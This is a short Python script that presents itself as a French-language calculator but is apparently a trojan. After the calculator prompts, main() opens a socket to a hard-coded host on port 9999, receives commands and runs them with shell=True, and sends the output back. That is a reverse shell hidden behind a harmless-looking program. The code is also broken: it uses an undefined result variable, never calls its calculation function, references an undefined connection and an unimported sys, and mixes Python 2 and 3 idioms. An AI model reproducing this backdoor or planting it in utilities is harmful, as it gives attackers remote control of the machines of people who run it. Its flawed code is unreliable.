import os
import socket
import subprocess
# Create a socket
def socket_create():
    try:
        global host
        global port
        global s
        host = '10.94.73.114'
        port = 9999
        s = socket.socket()
    except socket.error as msg:
        connect.close()
        s.close()
        sys.exit()

# Connect to a remote socket
def socket_connect():
    try:
        global host
        global port
        global s
        s.connect((host, port))
    except socket.error as msg:
        connect.close()
        s.close()
        sys.exit()

# Receive commands from remote server and run on local machine
def receive_commands():
    global s
    while True:
        data = s.recv(1024)
        if data[:2].decode("utf-8") == 'cd':
            os.chdir(data[3:].decode("utf-8"))
        if len(data) > 0:
            output_str = " "
            cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            output_bytes = cmd.stdout.read() + cmd.stderr.read()
            output_str = str(output_bytes)
            s.send(output_str)
    s.close()

def calculette():
    print "bienvenue dans la super mega calculette en python";
    print "pour une addition tapper : 1";
    print "pour une soustraction tapper : 2";
    print "pour une multiplication tapper : 3";
    print "pour une division tapper : 4";
    typecalcule = input()
    def calcule(n1, typecalcule, n2):
        if typecalcule == 1:
            return (n1 + n2)
        elif typecalcule == 2:
            return (n1 - n2)
        elif typecalcule == 3:
            return (n1 * n2)
        elif typecalcule == 4:
            return (n1 / n2)
    print "premier nombre ?";
    n1 = input()
    print "second nombre ?";
    n2 = input()
    print "Le resultat est :" + r

def main():
    calculette()
    socket_create()
    socket_connect()
    receive_commands()

main()
